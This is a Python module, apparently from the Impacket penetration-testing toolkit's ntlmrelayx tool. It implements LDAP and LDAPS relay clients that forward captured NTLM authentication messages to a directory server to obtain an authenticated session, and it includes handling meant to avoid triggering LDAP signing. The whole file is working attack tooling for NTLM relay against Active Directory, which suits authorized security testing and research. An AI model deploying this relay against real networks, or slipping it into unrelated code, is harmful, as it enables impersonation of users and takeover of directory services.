# Copyright (c) 2003-2017 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# LDAP Protocol Client
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
# Description:
# LDAP client for relaying NTLMSSP authentication to LDAP servers
# The way of using the ldap3 library is quite hacky, but its the best
# way to make the lib do things it wasn't designed to without touching
# its code
#
import sys
from struct import unpack
from impacket import LOG
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD
from ldap3.operation import bind
try:
    from ldap3.core.results import RESULT_SUCCESS
except ImportError:
    LOG.fatal("ntlmrelayx requires ldap3 > 2.0. To update, use: pip install ldap3 --upgrade")
    sys.exit(1)

from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["LDAPRelayClient", "LDAPSRelayClient"]

class LDAPRelayClientException(Exception):
    pass

class LDAPRelayClient(ProtocolClient):
    PLUGIN_NAME = "LDAP"
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort = 389, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None

    def killConnection(self):
        if self.session is not None:
            self.session.socket.close()
            self.session = None

    def initConnection(self):
        self.server = Server("ldap://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
        self.session.open(False)

    def sendNegotiate(self, negotiateMessage):
        #Remove the message signing flag
        #For LDAP this is required otherwise it triggers LDAP signing
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)
        #negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
        self.negotiateMessage = str(negoMessage)

        with self.session.connection_lock:
            if not self.session.sasl_in_progress:
                self.session.sasl_in_progress = True
                request = bind.bind_operation(self.session.version, 'SICILY_PACKAGE_DISCOVERY')
                response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                result = response[0]
                try:
                    sicily_packages = result['server_creds'].decode('ascii').split(';')
                except KeyError:
                    raise LDAPRelayClientException('Could not discover authentication methods, server replied: %s' % result)

                if 'NTLM' in sicily_packages:  # NTLM available on server
                    request = bind.bind_operation(self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
                    response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                    result = response[0]

                    if result['result'] == RESULT_SUCCESS:
                        challenge = NTLMAuthChallenge()
                        challenge.fromString(result['server_creds'])
                        return challenge
                else:
                    raise LDAPRelayClientException('Server did not offer NTLM authentication!')

    #This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_negotiate_message(self):
        return self.negotiateMessage

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob
        with self.session.connection_lock:
            self.authenticateMessageBlob = token
            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
            result = response[0]
        self.session.sasl_in_progress = False

        if result['result'] == RESULT_SUCCESS:
            self.session.bound = True
            self.session.refresh_server_info()
            return None, STATUS_SUCCESS

        return None, STATUS_ACCESS_DENIED

    #This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_authenticate_message(self):
        return self.authenticateMessageBlob

    #Placeholder function for ldap3
    def parse_challenge_message(self, message):
        pass

class LDAPSRelayClient(LDAPRelayClient):
    PLUGIN_NAME = "LDAPS"
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort = 636, extendedSecurity=True ):
        LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.server = Server("ldaps://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
        self.session.open(False)
